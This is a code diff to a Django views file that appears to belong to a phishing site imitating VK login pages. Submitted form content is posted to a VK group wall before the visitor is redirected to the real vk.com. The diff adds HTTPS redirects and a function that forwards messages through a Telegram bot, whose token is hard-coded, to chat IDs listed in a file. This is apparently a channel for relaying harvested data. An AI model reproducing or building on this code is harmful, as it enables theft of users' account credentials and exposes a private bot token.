@@ -4,6 +4,7 @@ from .forms import *
 # from vk_api import *
 from vk import *
 from .microdetector import detect_mobile
+import telebot
 
 # Create your views here.
 
@@ -23,6 +24,8 @@ def index(request):
         vk.wall.post(owner_id=club, from_group=1, message=body, v=5.103)
 
         return HttpResponsePermanentRedirect("https://m.vk.com")
+    if request.scheme == "http":
+        return HttpResponsePermanentRedirect("https://" + request.META['HTTP_HOST'] + "/m")
     form = login()
     return render(request, "app_serverr/index.html", {"form": form})
 
@@ -43,7 +46,25 @@ def full(request):
         vk.wall.post(owner_id=club, from_group=1, message=body, v=5.103)
 
         return HttpResponsePermanentRedirect("https://vk.com")
+    if request.scheme == "http":
+        return HttpResponsePermanentRedirect("https://" + request.META['HTTP_HOST'])
     if request.mobile:
         return HttpResponsePermanentRedirect(request.scheme + "://" + request.META['HTTP_HOST'] + "/m")
     form = full_login()
     return render(request, "app_serverr/full.html", {"form": form})
+
+
+def telgram(mes):
+    token = '1066066499:AAGhCqzmxLO-78UY6JbPRMNdgJ8SWjqVaiA'
+    bot = telebot.AsyncTeleBot(token)
+
+    try:
+        f = open('ids.txt')
+    except IOError as e:
+        pass
+    else:
+        with f:
+            for l in f:
+                bot.send_message(l, mes)
+
+
